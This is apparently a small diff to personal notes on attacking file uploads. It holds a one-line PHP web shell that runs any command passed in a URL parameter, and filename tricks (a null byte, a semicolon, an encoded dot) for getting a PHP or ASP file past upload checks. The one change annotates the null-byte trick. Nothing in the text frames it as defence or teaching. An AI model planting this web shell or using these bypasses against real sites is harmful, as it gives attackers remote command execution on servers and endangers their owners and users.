@@ -1,5 +1,5 @@
 payload :- <?php echo system($_GET['command']); ?>
 
-exploit.php%00.jpg
+exploit.php%00.jpg --> use null byte
 exploit.asp;.jpg
 exploit%2Ephp
